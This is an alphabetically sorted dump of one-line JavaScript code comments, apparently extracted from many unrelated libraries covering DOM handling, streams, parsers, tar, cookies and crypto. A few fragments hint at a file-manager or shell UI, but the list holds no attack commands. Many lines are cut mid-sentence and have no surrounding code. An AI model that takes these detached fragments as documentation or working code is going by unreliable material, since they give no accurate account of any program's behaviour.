// root node of this home sub tree
// root node.
// rotL: function (n) {
// rotR: function (n) {
// rough regular expressions
// round display percentage
// round up to 512 bytes
// rounded up to at least 1
// run async
// run only in the browser and not in server-side environments without a DOM.
// run suites
// run the function if it's first in line and not already running
// safe and faster
// safe early exit
// same as DOM DOCUMENT_POSITION_
// same as File
// same as NumberLiteralTypeAnnotation
// same as the start location.
// same chunks coming in also go out.
// same error.
// same for fchown/chown
// same from parser's perspective.
// same logic as string
// same object as above
// same protocol
// same way that tag soup parsers do. So we cannot shorten
// save animation class in cache to restore class names
// save current value
// save it back to filesystem
// save passed context
// save passed selector
// save previously collected result set
// save results into cache
// save scroll position
// save utility methods references
// scale factor for offset
// schedule any updates. We will simply ignore them.
// schedule our next run if one isn't already scheduled
// schedule the next check for the earliest possible buffer overrun.
// schema: false makes validate not to expect schema (ValidateFunction)
// scope
// scope that we're currently scanning.
// scope up
// scope.
// scope.functions must be empty as Module code is always strict.
// screen boundaries
// script loading context will be used as default context
// script origin of the context object's associated document.
// script tag into the document.
// scroll context for visibility checks
// scroll element if larger than screen
// search animation name for out/in class
// search anywhere in value (set to 'exact' to require exact matches)
// search backwards for the eocdr signature.
// search button
// search fields in WebKit/Blink
// search fields should be array to loop correctly
// search for parents matching the newChild
// search shortcuts
// second argument - input data
// second car
// secuirty
// see
// see #1149
// see GH-491
// see example.js for examples with other services
// see here: http://www.w3.org/TR/css3-selectors/#nth-child-pseudo
// see http://wiki.ecmascript.org/doku.php?id=harmony:const
// see http://www.w3.org/TR/xpath/#dt-principal-node-type
// see http://yura.thinkweb2.com/cft/
// see https://github.com/facebook/react/issues/3037
// see if any boundaries are surpassed with this tentative position
// see if select is placed correctly already
// see rls notes for 2.0.6 (this is a duplicate of minLength)
// seed = maskedSeed
// seedMask
// segment again.
// select alias
// select each item
// select elements matching selector
// select only the first element
// select the first option that is not disabled
// select the last selected option
// selected will also remove label
// selection/matching
// selectivizr exposes css through the rawCssText expando
// selector cache
// selector filter
// selector for text node
// selector group separator (comma)
// selectors descriptor
// selectors used
// self and source are DEV only properties.
// self reference to the window object.  This value is incremented in the
// self-closing tag
// self.cache[path] = data;
// self.cell.progressOff();
// semantics of the native select event.
// semantics over cleverly invoking the callback on new elements because
// semantics.
// semicolons lying around.
// semver major update we should change the default to this.
// send back results we have so far
// send back the user's message
// send stuff
// sends a JSON post body
// sensitive data).
// sequence tag/len pairs.
// serialization.
// serialize stuff
// serializing them or else the generated line numbers (which are defined
// server error
// server returns 125 when data connection is already open; we treat it
// servers send slightly invalid gzip responses that are still accepted
// set Request instance to be readable and writable
// set `.type` and `.typeFull` properties to MIME type
// set `diff` timestamp
// set `port` to null when it is the protocol default port (80 / 443)
// set all output to go via console.info
// set at run time
// set at run-time
// set by the CookieJar:
// set cursor position
// set default
// set default options
// set document root
// set dom token list without running update steps
// set header fields
// set headers
// set host environment flags
// set new context document
// set next value
// set of matched elements to its previous state.
// set site name
// set tcp no delay
// set the `.charset` property
// set the cookie if it's domain in the href's domain.
// set the extension -> mime
// set this namespace to log via console.log
// set to false for html-mode
// set to true and it does not execute
// set up automatic routing
// set up data events if they are asked for
// set up externs
// set/reset default identifier syntax
// setImmediate here because errors can be emitted during the first call to pipe()
// setState.
// sets just the max size
// sets new embed
// sets of options.
// setter
// setters and other features.
// setting or getting the value
// settings for api call
// settings grabbed at run time
// setup Barrett
// setup HTTP proxy server
// setup SOCKS proxy server
// setup SSL HTTPS proxy server
// setup primitive classes to be JSON Schema types
// setup target HTTP server
// setup target SSL HTTPS server
// setup timer and call original function
// setup:
// shallow-check fields defined by the less specific Def (this).
// share the same parents. When nodes created through `parseHTML` are
// shares the memory with arr;
// shell Type
// shift arguments to left by one
// shiftL: function (n) {
// shiftR: function (n) {
// shim for using process in browser
// shims
// short cut for encoding
// shortcut for tabbed content with no defined navigation
// shorthand
// should delete it for now since we handle timeouts manually for better
// should interpret it as a normal identifer.
// should match /json or +json
// should not be compressed.
// should reduce x and y(2-xy) by m^2 at each step to keep size bounded.
// should return the first dir created.
// should we decode strings into buffers before passing to _write?
// show Adobe Express Install
// show a file upload form
// show alternative content
// show menu on focus
// show the Adobe Express Install dialog if set by the web page author and if supported
// show the crash
// show when top visible
// show/hide pass
// shows current embed
// side-effects (all data will be serialized on save and only data that
// sidebar
// sigma0
// sigma1
// signal end of the stream
// similar to how Writable.write() returns true if you should
// simple analogy to while loops. Also note that labeled continue statements
// simple referencing
// simple use would be
// simply exist as properties on the parser object. This is only
// simulating response
// since a '/' inside a '[]' set does not end the expression.
// since its presence should be enough
// since otherwise we would trigger this very setter!
// since that compresses better and they're computed together anyway.
// since there's nowhere else to redirect to
// since they are just generating DOM strings.
// since we are a drop-in replacement for the native module
// since we can use the boxSizingReliable pre-computing.
// single ASCII symbol to avoid throwing on regular expressions that
// single equals check for both `null` and `undefined`
// single settings object
// situation where Minipass's auto-ending empty streams results
// size = 1 is default if not multiple
// size slider
// skip
// skip _not_ specified properties
// skip `(`
// skip `.`
// skip any comment-lines
// skip attribute nodes' text child.
// skip child nodes of current node
// skip if no har property defined
// skip if the builder already exists
// skip if there is nothing to wrap
// skip luhn for UnionPay
// skip nullish headers.
// skip obviously wrong attributes
// skip over all the rest of the same node.
// skip secondary callbacks
// skip simple selector optimizations for Opera >= 11
// skip the boolean and the target
// skip the remapping
// skip this cookie
// skipping any escaped characters in between
// slice is the same for buffers and strings
// slice is the same for buffers and strings.
// slice this function off the top
// slow case. multiple pipe destinations.
// slower
// slows significantly with higher concurrency!
// so JSON.stringify() works
// so `rs2` is undefined and you are expected to re-use results from
// so all visitor methods are inherited by context objects.
// so any new bindings can take effect. preserve attribute order
// so at least it won't get any bigger.
// so deferred events can be emitted in document order
// so distinguish between undefined and null in this place
// so don't do detection if we are running under Rhino
// so fallback non existing options to the default ones
// so far I'm not sure how to not do that. JSON.stringify's replacer is not
// so instead we use the fact that 1 / -0 < 0 whereas 1 / 0 > 0 .
// so it basically checks if there is any value added to the form
// so it is seen as the next token.
// so it parses back as an array
// so migrate can support jQuery.sub (gh-2101)
// so much arity going on ~_~
// so need to continue (same as for above)
// so other keys we fetch in localStorage aren't counted in
// so that event delegation works in jQuery.
// so that it's consistent if the number of children grows.
// so that we can use / as our one and only directory separator char.
// so the result will be a collection of strings if
// so the word boundary detection works properly. [MAP]
// so they're executed at the same time to save the second computation.
// so use a roundabout getElementsByName test
// so users should handle the stream themselves.
// so wait for it to finish in order to avoid a possible
// so we have an accurate clock)
// so we have to lstat here and make sure it's not a dir.
// so we just don't do anything about it.
// so we leave it alone
// so we should get '12' and not '1234'
// so will not preserve sparsely populated inputs.
// so would incorrectly report success
// so you can access ANY_TYPE etc. from the instances:
// socket and it will get removed from the pool. This
// socket or file.
// some kind of arraybuffer/binary data/typed array out of the string.
// some non-Node subproperty of a Node.
// some servers may not open a data connection for empty directories
// some source of some data
// something else
// something else bad happened...
// sometimes $.html() used without preloading html
// sometimes generates source maps with duplicates in them. See Github issue
// sometimes the initial greeting can contain useful information
// sometimes when it hasn't). IE's event fires out of order with respect
// sort array keys based on it's values
// sort object's keys just on own merit
// sort selection on init
// sorted does not cause O(n^2) running time.
// sorting helpers
// sorting of S5.4 part 2
// sorting order can be influenced:
// source
// source map automatically.
// source preference (least -> most)
// source: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Escaping
// sources of the consumer.
// space
// space.
// spaces as combinators
// span level renderer
// special callbacks for fixed position
// special callbacks for image
// special case for <script> in non-strict mode.
// special format
// special markers into our strings to mark them as encoded; this isn't
// specific URI data attributes (parameter 2 to fix IE bug)
// specific error message to try to guide them the right way.
// specific event
// specific message
// specification. The lists are extracted like so:
// specified as a relative path and is appended to baseUrl).
// specified.  We do this lazily to minimize issues related to insufficient
// specifies the order of arguments that should be passed to the builder
// specify a context that tabs must appear inside
// specify position to appear even if it doesn't fit
// speed & libs compat match unique ID (true)
// split out into 2 ifs for better coverage tracking
// sql
// src attribute values
// stack constructor before traversing properties
// stack to decide between skip/abort functions
// standard JS token or an JSX text node
// standard JS token or an XJS text node
// standard ajax settings
// standard callbacks
// standard module
// standard video settings
// start <= value <= finish
// start out asking for a readable event once data is transformed.
// start the flow if it hasn't been started already.
// start these browsers
// start() is called once we are ready to send the outgoing HTTP request.
// startTime
// stash the callbacks first
// state = [ resolved | rejected ]
// state change
// state test functions
// state.
// state.js
// statement.js
// statements
// static BigInteger valueOf(long val)
// static function
// static methods
// static non-function object
// static primitive
// static property
// static publishing
// status / class
// status code to message map
// status codes for empty bodies
// status codes for redirects
// status codes for when you should retry the request
// status message (lower-case) to code map
// step 1
// step 10
// step 11.2
// step 11.3
// step 12
// step 1: parse all files and figure out their dependencies
// step 2
// step 2: serialize the files in an order where dependencies are always above
// step 3
// still need to fetch file size from fs
// still not enough chars in this buffer? wait for more ...
// stop still active jobs
// stop subsequent errors hitting callback multiple times
// stop trying.
// stopWatching() should be a noop here but we call it just in case we
// storage library.
// storage('save_key').get('{}')
// storage('save_key').set('{a:123}')
// store
// store by cookie
// store callback
// store current index
// store current path
// store is optional
// store options
// store property names with dashes in a camelCase form.
// store something larger than a 32-bit time_t (even with 32-bit node)
// store the proxy URI in case of changes to the `url` prop in the future
// stored in `length`
// stored to fix object 'leaks' on unload (dynamic publishing only)
// storing the state needed by the diffing algorithms elsewhere.
// stream emitted an error
// stream from an existing fd which is writable only. But for now
// stream is finished
// stream stuff
// stream usage
// stream.unshift('') does not set state.reading=false.
// streamOfPaths().pipe(new Pack()).pipe(new fs.WriteStream('out.tar'))
// streams1: assert request encoding is buffer.
// streams2+: assert the stream encoding is buffer.
// strict QSA match all non-unique IDs (false)
// strict mode and parsing of `import` and `export` declarations.
// strict mode options
// stricter than regexp \s.
// strikes again! See github issue #191.
// string
// string 'null' or 'undefined'. Just delete instead.
// string literal.
// stringify json object
// strip Content-* related fields
// strip it from all operators and update it according to updateQuery
// strip newlines
// strip off the root
// strip question mark
// strong
// structural pseudo-classes and child selectors
// style values shouldn't contain a semicolon
// sub tlds always appear after their parents and we never find a shorter
// sub-menu actions
// subnet information
// subscribes to scrollchange
// substution
// subtraction forces infinities to NaN
// subtyping determinations. This suffices in most situations outside
// succeed and there will likely be errors in render.
// such nodes using their original source.
// sugar
// suite
// superagent is exposed as `window.superagent`
// superagentProxy(superagent);
// superfluous reconcile. It's possible for state to be mutable but such
// supertypes for other (printable) types.
// supplementary high + low surrogates
// support multiple terminating responses in the buffer
// support unix sockets
// support: jQuery < 1.8
// supported by the pretty-printer.
// supports async functions out of the box
// supports destructuring assignments. AssignmentPattern nodes may appear
// supports the new traversal API
// sure that the brackets around IPv6 addresses are kept.
// surrogate pair for U+1D306 TETRAGRAM FOR CENTRE:
// svg - https://bugzilla.mozilla.org/show_bug.cgi?id=649285
// swap 'a' for 'z'
// symbol sham key ordering is unreliable
// symbol-tree does not add these bits required by the spec:
// symlink
// sync
// sync guard flag.
// system entropy.  See #189
// t1 = h + sigma1 + ch + K[i] + W[i]
// t15 left as is
// t2 = sigma0 + maj
// tSFunctionTypeAnnotationCommon
// tab
// table
// table (gfm)
// table no leading pipe (gfm)
// tag
// tag. That particular tag will use this class instead of the generic one.
// tags get no namespace.
// take a set of comparators and determine whether there
// take away first argument
// take default of true
// take read range into a account
// takes a validation object and returns whether field passes validation
// takes an offset integer (into the current `input`) to indicate
// takes precedence over expires for TTL
// takes the same options as the parser
// takes validation rule and returns whether field passes rule
// tangle.
// tar -c
// tar -r
// tar -t
// tar -u
// tar -x
// tar implementations sometimes incorrectly put the stat(dir).size
// target is a window object
// target servers
// targetLoc have not changed.
// task.end('100%');
// task.failed(LANG['download']['task']['error']())
// tasks that have been identified as reachable
// tell the dest that it's being piped to
// temp disabled per https://github.com/WebReflection/get-own-property-symbols/issues/4
// temp disabled per https://github.com/ljharb/object.assign/issues/17
// template literals and strings
// template that produces error message
// template that produces label
// template to use (specified in settings.templates)
// templated URL to use
// temporarily disconnect observer
// tentatively place on stage
// term.error('ERR: ' + (_ instanceof Object) ? JSON.stringify(_) : String(_));
// terminate algorithm
// terminating events
// terminating response ....
// test
// test cases inversed from from stringify tests
// test if we can really add/remove elements to/from the DOM; we don't want to fire it too early
// test results reporter to use
// test whether there is an HTML object element or not
// tests are based on the jQuery selector test suite
// tests complete
// tests expect this to be nonglobal and use named capture
// tests started
// tests.
// text
// text node
// text nodes but who really cares about the fallback content.
// text/html ignores the first character in these tags if it's a newline
// than `timeout` to write the HTTP status and headers (corresponding to
// that a fs doesn't support the intended operation.
// that are available for this character.
// that as a Unix socket file.
// that can be represented in binary
// that can render any kind of tag.
// that embed JavaScript expressions.
// that fall outside that region.
// that future definitions will return the same type given the same name.
// that includes the same versions that the original range does
// that is not supported in the current environment. The `regex` property
// that logically apply to node.declaration.
// that nothing more will ever be provided
// that pass the validator function
// that performUpdateIfNecessary is a noop.
// that the 'typeAnnotation' key is ordered before others that
// that the first error is the one to bubble up.
// that the other NodePath objects wrapping body statements will
// that throws on second use.
// that to be increased. Set to zero for unlimited.
// that we don't block potential future ES APIs.
// that we emit 'end' on the very next tick.
// that we're awaiting a 'readable' event emission.
// that will always render to something. At least for now. So we can use
// that would overwrite object prototype properties
// that wraps the built Expression in an ExpressionStatements.
// that you are not allowed to call the parser from the
// that&#x27;s tech debt :(
// that:
// the 'readable' event and move on.
// the 'selected' property is only available for option elements
// the 512 for the header we just parsed will be added as well
// the AST node that the inner parser gave them in another node.
// the CoverInitializedName check is conducted.
// the DOM standard assumes the implementor has control over object life cycles.
// the FunctionExpression comes lexically first in the enclosing
// the ID of each key will change every time it's updated. Perhaps a stored
// the Internet
// the Non-Final tsadi to appear at an end of a word even though this is not
// the PEND/UNPEND stuff tracks whether we're ready to emit end/close yet.
// the Yallist.Node object.
// the Zlib class they all inherit from
// the `console.log` function doesn't have 'apply'
// the `iterationNumber` argument passed to the `iterate()`
// the `source` property as a convenience for inlining compiled templates.
// the actual outgoing request is not started until start() is called
// the actual printable character.
// the amount of time between the last attempt and right now
// the amount of time it took to render the entire subtree.
// the amount that is being written when _write is called.
// the app's key/value store!
// the arguments object. Passing **n** will return all the values in
// the buffer.  Advance the position and put any remainder in the buffer.
// the builder function to wrap with builders.ExpressionStatement
// the cache.
// the call of this function and the use of it below.
// the callback on each node
// the caller expect this to happen before if
// the case in the original text.
// the client and the server package. They should be built independently
// the closure scope they're defined in
// the code.
// the comments is active.
// the component is rerendered and the value reverted before all the event
// the consumer can miss the 'end' event if they do some I/O before
// the corresponding values.
// the count of uncompleted subordinates
// the cross-browser fixes module)
// the current node) and passes them to the callback as the state parameter.
// the data could not be faithfully encoded in a simple header.
// the data gets sucked out in flow.
// the default if the field is not actually defined.
// the differences between each other.
// the digits includes the length of the digits in ascii base-10
// the drain event emission and buffering.
// the element's _eventDefault function (only events that did not incur
// the element. We explicitly check for the existence of an owner since
// the empty array and our base case.
// the encoding is always cp437.
// the encoding was not found
// the end of the iteration.
// the entire buffer is not flushed immediately on write()
// the error to be emitted nextTick. In a future
// the expression in the .loc of the following quasi element.
// the first basic code points to the output.
// the flags outside of the parser. This means the production the parser parses is used as a part of a potential
// the following are deprecated in CSS3
// the following is lifted almost directly from
// the following table. Let n be the number given in the second cell of
// the full 512 bytes of a header to come in.  We will Buffer.concat()
// the handler that waits for readable events after all
// the in-memory indexes are affected)
// the initial and more favorable whitespace behavior.
// the item was created without expiration in a non aged cache
// the last field of the eocdr is a variable-length comment.
// the left-hand side! The existing AssignmentExpression type already
// the line we are searching for.
// the line we found.
// the local part (i.e. everything up to `@`) intact.
// the longer form to use methods like `.help()` on the Parser object.
// the markup. If you provide unsafe user data here they can inject
// the master Deferred.
// the matching unref() call is in zipfile.close()
// the names array.
// the native Python `range()` function. See
// the new elements are inserted right after that element.
// the newly allocated props object.
// the next one in the list.
// the no-half-open enforcer
// the number of milliseconds the current node process is running
// the number of writers that are awaiting a drain event in .pipe()s
// the old content
// the on('response') event on the client). NB: this measures wall-clock
// the order in which the RFC has them:
// the order it is read. It is the responsibility of the renderer to display
// the parser process. These options are recognized:
// the passed-in arrays.
// the path to a plain file
// the point at which it stops calling _read() to fill the buffer
// the point at which write() starts returning false
// the prependListener() method. The goal is to eventually remove this hack.
// the readable code triggers during a read() call
// the ready event fires. See #6781
// the real equiv function
// the regex itself
// the rest N values in the array. The **guard**
// the rest parameter using ordinary JavaScript.
// the rest works just like any other normal HTTP request
// the result of a `url.parse()` call... we need to remove the
// the result will be equal to 'two' as it finishes earlier
// the results of the previous transformed chunk were consumed.
// the same options object.
// the same process without using apply
// the second function had a shorter timeout.
// the secret object.
// the socket is closed (e.g. the server ran out of space).
// the source-map library are loaded. This MUST NOT CHANGE across
// the spec.  This block is basically the equivalent of:
// the spec. Returns whether the event was handled or not.
// the specified `name`:
// the stack via arguments.caller.callee and Firefox dies if
// the stream was destroyed
// the system to stop doing the transform.  A single 4MB write could
// the tests go through this
// the text from right to left. A BIDI algorithm is used to place general
// the true start/end positions of the node.
// the unwanted keypress events. Enter is however both printable and
// the upcoming resume will not flow.
// the user.
// the valid border-styles:
// the valid border-widths:
// the value is not present
// the value was not present
// the version string are capturing groups.  The build metadata is not a
// the way web server expects it
// the wrong namespace (and will not display).
// their IndexedDB is too old for us to use.
// their child nodes (by calling their third argument on these
// their default value will be used.
// them before their children by sorting the array.
// themselves only
// then after unreachable-branch-transform
// then call resume to start the flow of data on the next tick.
// then fail on them now.
// then get the length
// then go ahead and try to read some more preemptively.
// then it is a subset.
// then raise the water mark.  Bump up to the next highest
// then super.write() all the outputted chunks
// then that means we are about to delete the directory we created
// then the bug could come back. So it's worthwhile to watch these issues:
// then use exactly as the standard one
// then warn for impossible downgrade.
// then we'll need an explicit chmod
// then we're ok.
// there because we already warned for the corresponding lifecycle method.
// there is a problem -- we should be in the second conditional block
// there is no guarantee that line length will fit inside this limit.
// there is no way to cleanly recover.
// there must be only whitespace before it.
// there will be only 2 of these for each stream
// there's enough pending readable data buffered up.
// therefore synchronous length calculation is false.
// therefore undefined.
// these are actually numbers
// these are duplicated from String.prototype.replace tests in the overridden natives module
// these capabilities may be emulated by some event managers
// these code points. windows-1255 defines additional characters in the range
// these have a getter/setter for warnings
// these items may be unset if they were added by an older graceful-fs
// these letters as Non-Final letters outweighs the damage since these words
// these new updates so that if A's componentDidUpdate calls setState on
// they are instantiated. So we aggregate inclusive time with both the
// they can be inspected during a subsequent call to GET the same URI
// they might have.
// they should be warned that it can be caused by a redirection (can save some hair)
// they will not be called.
// third argument - iterator
// third argument to Def.prototype.field.
// third party cannot interfere with the functionality of this module by
// this === el
// this IO would be asynchronous
// this by omitting <tbody> or other required elements.
// this can trigger for too many reasons
// this case we can't simply undo the transform.
// this character will simply our logic and improve performance.
// this ensures at this point that the chunk is a buffer or string
// this error is thrown by async schemas to return validation errors via exception
// this function is called from both the constructor and on redirect.
// this function will be called once per listing entry
// this function will just be passed a callback
// this gets filled from getAllCookies:
// this hack.
// this has a getter/setter for warnings
// this has a risk of stack overflows if many results are cached in a row
// this is here so that some node-core streams can optimize string
// this is no longer necessary
// this is not directive
// this is pretty straight-forward - we use the crypto API.
// this is required for Node v0.10+
// this is run at the same time as getting the data
// this is the element
// this is the important part!
// this is the only approach that was significantly faster than using
// this is the only setting which should not extend defaults
// this is used for sub pixel precision
// this is what Node? means in the IDL
// this is where external extensions are
// this level.
// this lexes.
// this makes sure $.extend does not add specified search fields to default fields
// this means there weren't enough keys
// this method can be overwritten by the user
// this must be 0 before 'finish' can be emitted
// this node generically.
// this point the HTTP module machinery has been hooked up for
// this really needs to be replaced with character classes.
// this resets the start of the 60 second overall timeout as well as the
// this should be `import ModuleSpecifier` so skip `from`
// this socket connection to a TLS connection.
// this subtree.
// this value down
// this value wrong.
// this way is much easier to reason about.
// this will be the case when you call deleteRecursively() and pass
// this will parse jsx
// this will run soon
// this will throw if any options are invalid for the class selected
// this would be synchronous!!
// this.AbortRequest) that will be caught in the top-level
// this._events to be assigned to a new object
// this.cache = {};
// this.checkAllFields make the final decision.
// this.core.base.info((ret) => {
// this.core.filemanager.delete({
// this.core.filemanager.dir({
// this.needToCallTraverse is still true.
// this.parse();
// this.props is actually a ReactElement
// this.stack.
// this.update = new Update(sidebar);
// this[BUFFER] is the remainder of a chunk if we're waiting for
// this[QUEUE] is a Yallist of entries that haven't been emitted"
// those are also defaults limits when no options object is passed into safeStringify
// those lines.
// those special-case tags.
// though it originated in Node.js/io.js!
// three lines.
// through
// through it. So you can analyze page content and e.g. save it
// throw an error if we trigger a nextTick warning.
// throw an exception if an attempt to read a data cache is made.
// throw error in case of non string input
// throw out any comparator lists that are empty
// throws
// throws ReferenceError: process is not defined
// tick (7)
// tie up the JavaScript thread and fail on excessively
// time because we almost always (maybe always?) append the
// time due to an abnormal WebSocket closure.
// time interval
// time is handled internally as 'msecs' (integer milliseconds) and 'nsecs'
// time: 2021/6/5
// timeRange(hour)
// timeout
// timeout handle
// timing pauses
// timings is just for the final fetch
// tiny amounts
// tiny node-tap lookalike.
// title is used for result lookup
// to
// to adjust the next and last properties. We implement only the minimal functionality
// to also support badly authored HTML pages that lack a head element
// to an original position.
// to avoid double callback
// to avoid infinite loops.
// to avoid piling up things on the stack
// to avoid the constant reflow
// to avoid treating leading and trailing
// to avoid writing a live loading document create a fake one
// to base64
// to catch a logic error. The condition shall be fulfilled in normal case.
// to catch short annotaion VS 'new' annotation of a declaration
// to check the next character.
// to continue to work with older versions of Node.js that do not include
// to convert from UTF-16 (which all JS strings are encoded in).
// to create new Lines objects.
// to do something with all expressions. All Parser API node types"
// to doc. Append the newly created node to doc.
// to fail with an EACCES or EPERM if the directory contains newly
// to find the callsite that caused this warning to fire.
// to find the original width we overide the width and height
// to fire the load event
// to get stuck in a permanently paused state if that write
// to go ahead and print it here.
// to group the metrics for a given flush together so we can look at the
// to handle uncaught aborts
// to indicate whether the transfer was actually a success or not
// to its body instead of creating a new node.
// to javascript string with characters representations
// to javascript string with javascript escape sequences
// to make it re-entrance safe in case destroy() is called within callbacks
// to make sure blur and focus event listeners are only attached once
// to point out that the above statement has the same effect.
// to provide data as an alternative to this.push('wut?')
// to re-generate the string since we just changed the `req.path`.
// to retry individual methods that are not as reliable within other
// to retry() whenever a close happens *anywhere* in the program.
// to save the modified contents of that file:
// to see if it's a quota error.
// to set props and state but we shortcut the rest of the update.
// to simplify the example.
// to simulate a real intrinsic that is missing in the environment
// to the SourceNode without any mapping.
// to the absolute path of the URL that will be requested.
// to the file at the same time:
// to the iterator.
// to the readable side.  You may call 'push' zero or more times.
// to the super class going forward. Example:
// to throw data away if .ignore=true
// to us at this point.
// to whether the word contained a '\u' escape.
// to.
// toType to be a total function.
// toggle code
// tokExprAllowed stays unchanged
// token in a way that is very cheap for the parser to look up.
// tokenChars[32] === 0 // ' '"
// tokenChars[33] === 1 // '!'
// tokenize.js
// too slow.
// toolbar.enableItem('exec');
// toolbar.setIconSize(24);
// toolbar_host.setIconsPath('./static/dhtmlx/samples/dhtmlxToolbar/common/imgs/');
// top edge
// top level
// top or left is auto and position is either absolute or fixed
// top-level paragraph
// toplevel forms of the parsed file to the `Program` (top) node
// total buffers count for encrypt
// total classes
// total sequence received
// total sequences: 100%
// trailing commas.
// transfer was actually a success or not
// transform code to array of tokens:
// transform is a noop
// transformation. So its square root can be used as a scale factor
// transformed away before printing.
// transition durations
// transition settings
// transpiled es7 async function
// traverseAllChildren used to do for objects as children
// treatFunctionsAsVar).
// tree grid
// tricky windows absolute path with UNC or 8.3 parts (and
// trigger pretty-printing unnecessarily.
// trim non-relevant leading/trailing whitespaces
// true
// true Cheerio instances.
// true if record is found
// true or false according to whether the value matches the type.
// true or false if there is anything in the queue when
// true owner.
// true to allow identifiers containing Unicode (utf-16) chars
// true to allow identifiers containing non-ASCII (utf-8) chars
// true to disable complex selectors nested in
// true to match lowercase tag names of SVG elements in HTML
// true to use browsers native Query Selector API if available
// true:
// trunc(num)
// truncated header
// truncating makes no sense when writing into the middle
// trust URLs moving forward. See #2115901
// try calling apiMethod 10 times with exponential backoff
// try calling apiMethod 3 times
// try calling apiMethod the default 5 times no delay between each retry
// try the IP of the control connection if the server was somehow
// try to extract the composed characters from the fallback object.
// try to find the right one.
// try to reprint it without also reprinting the export declaration.
// tslint:disable-next-line:no-increment-decrement
// turn ><?| in filenames into 0xf000-higher encoded forms
// turn into a set of JUST comparators.
// turn on object mode
// turn tar(1) style args like `C` into the more verbose things like `cwd`
// turn the `arguments` into a proper Array
// two rows
// type
// type of storage to use
// type of the event.
// type properties with the defaults.
// type to perform the same normalizations before comparing.
// typeof
// types newly introduced by def(...)).
// typically its .loc.start and .loc.end will coincide with those of
// u = Y2 * Z1 - Y1 * Z2
// uid + gid.
// uistates + dynamic + negation pseudo-classes
// unary operator.
// unbuffered
// uncaught callback
// uncaught exception
// unchanged property.
// uncomment the following line of code:
// undefined
// undefined (no match since they mean field doesn't exist and can't be serialized)
// undefined falls back to defaults
// undefined when it doesn't find a matching node.
// underlying stream.
// underscore functions. Wrapped objects may be chained.
// understands anonymous AMD modules. A named AMD is safest and most robust
// unexpected end of file is ignored by browsers and curl
// unicode/ISO 10646 characters \xA0 and higher
// unique id
// unique nested structures.
// unless it is a string already ready for us to use
// unless we can proove it
// unless we redefine it.
// unlink files and links before writing. This breaks existing hard
// unmodified http.IncomingMessage object
// unpack.
// unpipe everything from the stream
// unprintable ASCII chars + non-ASCII chars
// unset the PART_BOUNDARY flag
// unsupported
// unsupported types are ignored.
// until `blur` in IE8.
// unwanted click events.
// up arrow (traverse menu up)
// up in Node's output if this results in an unhandled exception.
// up to a maximum of 100ms
// update calculations derived from scroll
// update classList
// update final size based on the range options
// update readableListening so that resume() may be a no-op
// update stats
// update the buffer info.
// updatedAt modified
// updates enqueued by setState callbacks and asap calls.
// uphold the illusion by pretending to see that original data
// upload timeout it's wokrs only if deadline timeout is off
// uri fragment: https://tools.ietf.org/html/rfc3986#appendix-A
// uri-template: https://tools.ietf.org/html/rfc6570
// uri: https://github.com/mafintosh/is-my-json-valid/blob/master/formats.js
// url (gfm)
// url first
// use ForeverAgent in node 0.10- only
// use a negated character range class instead
// use a shadow document body as context
// use a warning instead of an invariant so components
// use am to combine the multiply-shift-add into one call
// use an InlineLexer with a TextRenderer to extract pure text
// use an unattached div node as context
// use aws4
// use browser history
// use custom content-type above all
// use custom params
// use default (511 as implemented in net.js)
// use either id or name of field
// use faster native method
// use json error message
// use just like fs
// use only tabs that are children of context
// use plain assignment
// use private key for encryption
// use public key for decryption
// use server error message
// use the class method CookieJar.deserialize instead of calling this directly
// use the setter so we throw if we have encoding set
// use this instead of `setDriver()`.
// use to define the type.
// use window context if none specified
// used as property names.
// used for queues. This implementation assumes that the node provided by the user can be modified
// used for the onToken callback and the external tokenizer.
// used to break creation ties in cookieCompare():
// used to check both getAttribute/hasAttribute in IE
// used to pass methods to compiled functions
// useful for aggregating a series of changing but not ending streams into one stream)
// useful for fine-grained formatting decisions like inserting
// user can override it through ajaxSetup method
// userland ones.  NEVER DO THIS. This is here only because this code needs
// userland will fail
// users see:
// uses pjax style endpoints fetching content from same url with remote-content headers
// uses.
// using apply
// using new Query Selector API
// using regular expression
// utf-8
// utf-8-validate@<3.0.0
// utility callbacks
// utility function for forgiving parser
// utility functions
// utility to translate from border-width to borderWidth
// uuid: http://tools.ietf.org/html/rfc4122
// v = X2 * Z1 - X1 * Z2
// v7
// val should be defined now
// validate a value against a property definition
// validate a value against a type definition
// validate an object against a schema
// validate file name
// validate file size
// validation and reporting options:
// validation.
// validator config
// validator for complex selectors in ':not()' pseudo-classes
// validator for standard selectors as default
// value
// value === 42
// value at the end to obtain `delta`.
// value contains text (case sensitive)
// value contains text (insensitive)
// value is most likely url
// value is not another value (case insensitive)
// value is not another value (case sensitive)
// value is otherwise provided. For example: default parameter values.
// value of kCapture in case the uncaughtException is present
// value to store in dismissed localstorage/cookie
// value.comments is defined.
// values
// values for the readable and the writable sides of the duplex stream.
// values in the array. Aliased as `head` and `take`. The **guard** check
// values in the array. The **guard** check allows it to work with `_.map`.
// values.
// var A: (a: B) => void;
// var ajv = new Ajv({schemaId: 'auto'});
// var carry = (low >>> 0) < (this.low >>> 0) ? 1 : 0;
// var chart_1 = cell_host_data.attachChart({
// var high = (this.high + word.high + carry) | 0;
// var high = (this.high << n) | (this.low >>> (32 - n));
// var high = 0;
// var high = this.high & word.high;
// var high = this.high >>> n;
// var high = this.high ^ word.high;
// var high = this.high | word.high;
// var high = this.low << (n - 32);
// var high = ~this.high;
// var low = (this.low + word.low) | 0;
// var low = (this.low >>> n) | (this.high << (32 - n));
// var low = 0;
// var low = this.high >>> (n - 32);
// var low = this.low & word.low;
// var low = this.low << n;
// var low = this.low ^ word.low;
// var low = this.low | word.low;
// var low = ~this.low;
// var node = nodeList.shift();
// var nodeList = 1 === nodeTypeNum && null != node.children ? node.children : node.childNodes;
// var value = 'What we save offline';
// var value = undefined;
// various contributors and released under an MIT license.
// vendor-specific stuff
// verbatim is object
// verbose debug output
// verbose ways of binary <-> string data storage.
// verified with twitter that they are authorizing your app.
// verify card types
// verify each card type
// verify that that's the case.
// verify that that's the case. (This is called by each top-level update
// version doesn't. The new line must still be there upon deserialization
// version of one browser.
// versions of Android (including those used by Cordova).
// versions!
// very large negative number test by Brian O
// via the ';' separators) will be all messed up. Note: it might be more
// vim: set filetype=javascript :
// vim: set ts=4 sts=4 sw=4 et:
// visibility
// visibility check delay in ms (defaults to animationFrame)
// visible menu keyboard shortcuts
// visual Hebrew.
// vm initialization is defered until script processing is activated (in level1/core)
// void(0) prevents problems with redefinition
// w
// w = 3 * x1^2 + a * z1^2
